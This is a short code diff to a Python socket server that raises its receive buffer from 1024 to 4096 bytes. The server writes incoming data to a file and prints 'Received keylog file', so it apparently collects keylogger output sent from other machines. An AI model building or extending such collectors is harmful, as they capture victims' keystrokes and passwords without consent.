@@ -13,10 +13,10 @@ while True:
     i=i+1
     while (True):       
     # receive data and write it to file
-        l = sc.recv(1024)
+        l = sc.recv(4096)
         while (l):
                 log_file.write(l)
-                l = sc.recv(1024)
+                l = sc.recv(4096)
     log_file.close()
     print("Received keylog file")
     sc.close()
